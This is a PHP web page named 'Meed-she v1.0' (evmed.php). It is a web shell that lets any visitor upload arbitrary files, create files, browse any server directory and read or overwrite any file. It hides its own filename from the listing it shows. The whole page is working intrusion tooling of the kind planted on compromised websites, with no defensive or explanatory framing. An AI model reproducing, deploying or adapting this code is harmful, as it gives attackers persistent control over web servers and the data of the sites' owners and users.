<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meed-she v1.0</title>
    <style>
        @import url('https://fonts.cdnfonts.com/css/road-rage');

        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            color: #fff;
            background-image: url('https://cdn.pixabay.com/photo/2017/02/18/12/31/hacking-2077124_640.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center center;
        }

        .container {
            max-width: 800px;
            margin: 50px auto;
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
            text-align: center;
        }

        h1 {
            font-family: 'Road Rage', cursive;
            margin-bottom: 20px;
        }

        form {
            margin-top: 20px;
        }

        label {
            display: block;
            margin-bottom: 10px;
        }

        input[type="file"] {
            margin-bottom: 10px;
        }

        input[type="submit"], input[type="button"] {
            background-color: #4caf50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-right: 10px;
        }

        input[type="submit"]:hover, input[type="button"]:hover {
            background-color: #45a049;
        }

        a {
            color: #3498db;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        textarea {
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        /* Style for the pop-up message */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px;
            background: #4caf50;
            color: white;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            z-index: 1;
        }
    </style>
</head>
<body>

<div class="container">

    <h1>Meed-shev1.0</h1>

    <?php
    
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST["createFile"])) {
            $newFileName = isset($_POST["newFileName"]) ? $_POST["newFileName"] : "";
            if (!empty($newFileName)) {
                $newFilePath = "./" . $newFileName;
                if (!file_exists($newFilePath)) {
                    $newFile = fopen($newFilePath, "w");
                    fclose($newFile);
                    echo "The file {$newFileName} has been created successfully.";
                    echo "<script>showPopup('File Created Successfully');</script>";
                } else {
                    echo "Sorry, the file {$newFileName} already exists.";
                }
            } else {
                echo "Please provide a valid file name.";
            }
        } elseif (isset($_FILES["fileToUpload"])) {
            // Your existing file upload logic goes here
            echo "The file " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.";
            echo "File URL: " . htmlspecialchars($targetFile);
            echo "<script>showPopup('File Uploaded Successfully');</script>";
        }
    }
    
    
    
    
    
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST["createFile"])) {
            $newFileName = isset($_POST["newFileName"]) ? $_POST["newFileName"] : "";
            if (!empty($newFileName)) {
                $newFilePath = "./" . $newFileName;
                if (!file_exists($newFilePath)) {
                    $newFile = fopen($newFilePath, "w");
                    fclose($newFile);
                    echo "The file {$newFileName} has been created successfully.";
                } else {
                    echo "OK";
                }
            } else {
                echo "Please provide a valid file name.";
            }
        } elseif (isset($_FILES["fileToUpload"])) {
            // Your existing file upload logic goes here
        }
    }
    
    
    
    
    
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $targetDirectory = "./uploads/";

    if (!file_exists($targetDirectory)) {
        mkdir($targetDirectory, 0777, true); // Create the directory if it doesn't exist
    }

    $targetFile = $targetDirectory . basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;

    // Check if file already exists
    if (file_exists($targetFile)) {
        echo "";
        $uploadOk = 0;
    }

    // Check file size (adjust as needed)
    if ($_FILES["fileToUpload"]["size"] > 50000000000000000) {
        echo "";
        $uploadOk = 0;
    }

    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
        echo "OK";
    } else {
        // Move the uploaded file to the specified directory
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "The file " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.";
            echo "File URL: " . htmlspecialchars($targetFile);
        } else {
            echo "OK";
        }
    }
}

    
    
    
    $q = isset($_GET["q"]) ? $_GET["q"] : "";
    if ($q == "") {
        $katalog = opendir("./");
    } else {
        $katalog = opendir("$q");
    }

    $lista = array();
    while ($plik = readdir($katalog)) {
        if ($plik != "." && $plik != ".." && $plik != "evmed.php") {
            $lista[] = $plik;
        }
    }
    closedir($katalog);

    if (count($lista) > 0) {
        echo "EDIT > :";
        sort($lista);
    }

    for ($i = 0; $i < count($lista); $i++) {
        echo "<br />edit <b>{$lista[$i]}</b> <a href=evmed.php?Edit={$lista[$i]}>Edit</a>";
    }

    $Edit = isset($_REQUEST["Edit"]) ? $_REQUEST["Edit"] : "";
    if ($Edit != "" && file_exists($Edit)) {
        echo "<p> </p>Edit > : <b>{$Edit}</b>";
        echo "<form action=evmed.php method=post><input type=hidden name=Edit value={$Edit} />";
        echo "<textarea name=tekst rows=20 cols=50>";

        $f = fopen($Edit, "r");
        while (!feof($f)) {
            echo htmlspecialchars(fread($f, 1024));
        }
        fclose($f);

        echo "</textarea><input type=submit value=Edit /></form>";
    }

    if (isset($_POST["tekst"]) && file_exists($Edit)) {
        $f = fopen($Edit, "w");
        fputs($f, stripslashes($_POST["tekst"]));
        fclose($f);
    }
    ?>
    
    <form action="evmed.php" method="post" enctype="multipart/form-data">
        <label for="fileToUpload">Select a file to upload:</label>
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="Upload">
    </form>

    <form action="evmed.php" method="post">
        <label for="newFileName">Create a new file:</label>
        <input type="text" name="newFileName" id="newFileName" placeholder="Enter a file name">
        <input type="submit" name="createFile" value="Create File">
    </form>

    <!-- Popup message -->
    <div class="popup" id="popupMessage"></div>

    <script>
        // JavaScript function to show the popup message
        function showPopup(message) {
            var popup = document.getElementById("popupMessage");
            popup.innerHTML = message;
            popup.style.display = "block";
            setTimeout(function () {
                popup.style.display = "none";
            }, 3000); // Adjust the time the popup is displayed (in milliseconds)
        }
    </script>


</div>

</body>
</html>
